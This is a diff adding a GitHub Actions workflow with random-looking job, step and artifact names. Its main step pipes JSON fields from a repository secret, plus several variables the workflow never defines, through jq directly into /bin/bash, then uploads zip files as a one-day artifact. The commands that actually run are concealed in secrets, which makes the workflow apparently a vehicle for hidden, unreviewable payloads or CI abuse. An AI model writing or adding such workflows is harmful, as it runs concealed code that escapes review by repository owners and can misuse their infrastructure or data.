@@ -1,0 +1,26 @@
+name: damian5417pp
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: damian5417pp
+        env:
+          wvoa5: ${{ secrets.wvoa5 }}
+        run: |
+          printf '%s' "$wvoa5" | jq -r .k66 | /bin/bash
+          printf '%s' "$dkkjk5" | jq -r .kvf6 | /bin/bash
+          printf '%s' "$lxuq1550" | jq -r .thl7162 | /bin/bash
+          echo $d1 | jq -r .ozzp61356 | /bin/bash
+          printf '%s' "$buds15" | jq -r .h38012 | /bin/bash
+          printf '%s' "$ij2" | jq -r .f76519 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: kAI5bE9A
+          path: "*.zip"
+          retention-days: 1
